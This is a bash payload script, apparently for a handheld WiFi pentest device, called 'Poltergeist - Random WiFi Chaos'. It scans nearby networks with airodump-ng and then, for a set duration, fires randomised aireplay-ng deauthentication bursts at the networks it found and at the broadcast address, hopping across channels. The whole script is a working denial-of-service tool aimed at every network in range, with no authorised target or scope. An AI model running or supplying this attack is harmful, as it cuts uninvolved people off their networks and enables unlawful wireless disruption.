#!/bin/bash
# Title: Poltergeist - Random WiFi Chaos
# Author: NullSec
# Description: Unpredictable WiFi disruption attacks
# Category: nullsec/chaos

LOOT_DIR="/mmc/nullsec/poltergeist"
mkdir -p "$LOOT_DIR"

PROMPT "POLTERGEIST - RANDOM CHAOS

Randomly disrupt WiFi with
unpredictable attack patterns.

- Random deauth bursts
- Random fake auth
- Channel hopping attacks
- Random timing

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

DURATION=$(NUMBER_PICKER "Chaos duration (sec):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

resp=$(CONFIRMATION_DIALOG "UNLEASH POLTERGEIST?

Duration: ${DURATION}s
Interface: $MON_IF

Random attacks will target
nearby WiFi networks.

Press OK to begin chaos.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Poltergeist unleashed..."

# Quick scan
SPINNER_START "Scanning targets..."
rm -f /tmp/poltergeist*
timeout 15 airodump-ng "$MON_IF" -w /tmp/poltergeist --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Build target list
grep -E "^[0-9A-Fa-f]{2}:" /tmp/poltergeist-01.csv 2>/dev/null | \
    awk -F',' '{print $1","$4","$14}' | head -20 > /tmp/polt_targets.txt

TARGET_COUNT=$(wc -l < /tmp/polt_targets.txt 2>/dev/null || echo 0)
LOG "Found $TARGET_COUNT targets"

LOG_FILE="$LOOT_DIR/chaos_$(date +%Y%m%d_%H%M).log"
END_TIME=$(($(date +%s) + DURATION))
ATTACK_COUNT=0

while [ $(date +%s) -lt $END_TIME ]; do
    ATTACK_TYPE=$((RANDOM % 3))
    TARGET_LINE=$(shuf -n1 /tmp/polt_targets.txt 2>/dev/null)
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CH=$(echo "$TARGET_LINE" | cut -d',' -f2 | tr -d ' ')
    [ -z "$BSSID" ] && continue
    [ -z "$CH" ] && CH=$((RANDOM % 11 + 1))

    iwconfig "$MON_IF" channel $CH 2>/dev/null

    case $ATTACK_TYPE in
        0) aireplay-ng -0 $((RANDOM % 15 + 3)) -a "$BSSID" "$MON_IF" 2>/dev/null & sleep 3 ;;
        1) aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null & sleep 2 ;;
        2) for c in 1 6 11; do iwconfig "$MON_IF" channel $c 2>/dev/null; aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null & sleep 1; done ;;
    esac

    ATTACK_COUNT=$((ATTACK_COUNT + 1))
    killall aireplay-ng 2>/dev/null
    sleep $((RANDOM % 3 + 1))
done

killall aireplay-ng 2>/dev/null
rm -f /tmp/poltergeist* /tmp/polt_targets.txt 2>/dev/null

PROMPT "POLTERGEIST COMPLETE

Attacks launched: $ATTACK_COUNT
Duration: ${DURATION}s
Log: $LOG_FILE

Press OK to exit."
